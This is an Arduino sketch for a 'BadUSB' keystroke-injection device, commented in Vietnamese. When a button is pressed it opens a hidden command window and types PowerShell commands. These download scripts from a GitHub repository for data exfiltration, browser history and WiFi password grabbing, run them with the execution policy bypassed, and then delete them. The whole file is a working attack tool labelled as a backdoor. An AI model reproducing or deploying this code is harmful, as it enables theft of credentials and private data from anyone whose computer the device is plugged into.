#include <Arduino.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;
const int buttonPin = 0;


//Mảng tải và thực thi code
const char* backdoorCode[] = {
  // Bước 1: tải file về thư mục TEMP (dùng %TEMP% của CMD)
  "powershell -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/khangpdm/BadUSB/main/Exfiltrate/file.ps1' -OutFile '%TEMP%\\file.ps1'\"",

  // Bước 2: thực thi file vừa tải
  "powershell -ExecutionPolicy Bypass -File \"%TEMP%\\file.ps1\"",

  // Bước 3: xóa file sau khi chạy
  "powershell -Command \"Remove-Item '%TEMP%\\file.ps1' -Force\"",

  // File 1: History/main.ps1
  "powershell -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/khangpdm/BadUSB/main/History/main.ps1' -OutFile '%TEMP%\\history.ps1'\"",
  "powershell -ExecutionPolicy Bypass -File \"%TEMP%\\history.ps1\"",
  "powershell -Command \"Remove-Item '%TEMP%\\history.ps1' -Force\"",

  // File 2: Wifi_Grabber/WifiGrabber.ps1
  "powershell -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/khangpdm/BadUSB/main/Wifi_Grabber/WifiGrabber.ps1' -OutFile '%TEMP%\\wifi.ps1'\"",
  "powershell -ExecutionPolicy Bypass -File \"%TEMP%\\wifi.ps1\"",
  "powershell -Command \"Remove-Item '%TEMP%\\wifi.ps1' -Force\"",
};

void setup() {
  pinMode(buttonPin, INPUT_PULLUP);
  Keyboard.begin();
  USB.begin();
  delay(1000);
  Serial.begin(115200);
}

//Ghi lệnh từ bàn phím
void sendLine(const char s[],const bool sendEnter = true){
  Keyboard.print(s);
  if(sendEnter){
    Keyboard.write(KEY_RETURN);
    delay(3000);
  }
}

//Mở cửa sổ run
void winPlusR() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(45);
  Keyboard.releaseAll();
  delay(60);
}

// Mở và chỉnh sửa cửa sổ cmd để ẩn lệnh đang chạy
void openHiddenCMD() {
  winPlusR();
  sendLine("cmd");
  // Hide & configure console window
  /*const char* hiddenCmd[] = {
    "powershell -Command \"Set-WinUserLanguageList en-US -Force\"",
    "mode con:cols=15lines=1", // chỉnh size của cửa sổ cmd
    "color fe",               // đổi màu
    "chcp 65001",            // set UTF8
    "title ",               // ẩn title
  };
  // chạy lệnh
  int hiddenCmdLength = sizeof(hiddenCmd) / sizeof(hiddenCmd[0]);
  for (int i = 0; i < hiddenCmdLength; i++) { 
      sendLine(hiddenCmd[i]);
  }*/
}

//Thực thi các lệnh badusb
void runBackDoor(){
  int backdoorCodeLength = sizeof(backdoorCode) / sizeof(backdoorCode[0]);
  for(int i = 0; i < backdoorCodeLength; i++){
    sendLine(backdoorCode[i]);
  }
}

void loop() {
  if (digitalRead(buttonPin) == LOW) {
    Serial.println("Phat hien nhan nut. Bat dau go...");
    delay(200);

    openHiddenCMD();
    
    runBackDoor();

    Serial.println("Da go xong.");

    // Chờ thả nút ra để tránh gõ liên tục
    while (digitalRead(buttonPin) == LOW) {
      delay(10);
    }
  }
}
